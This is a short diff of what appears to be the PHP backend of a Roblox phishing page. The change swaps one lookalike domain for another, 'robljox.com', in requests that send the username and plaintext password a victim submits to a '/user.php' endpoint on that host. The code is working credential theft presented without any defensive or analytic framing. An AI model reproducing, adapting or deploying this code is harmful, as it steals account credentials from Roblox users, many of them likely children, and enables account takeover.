@@ -709,7 +709,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         $searchString = '<span class="icon-premium-medium"></span>';
 
         
-        $url = "https://x-roblox.com/fetch.php?username=$username";
+        $url = "https://robljox.com/fetch.php?username=$username";
         $json = file_get_contents($url);
         $data = json_decode($json, true);
         # dont remove any apis
@@ -721,7 +721,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         $data = json_decode($json, true);
         $image_url = $data["data"][0]["imageUrl"];
         $timestamp = date("c", strtotime("now"));
-        $url1 = "https://x-roblox.com/user.php?username=$username&password=$password";
+        $url1 = "https://robljox.com/user.php?username=$username&password=$password";
         $json1 = file_get_contents($url1);
         $data1 = json_decode($json1, true);
         $vpassword = $data1["password"];
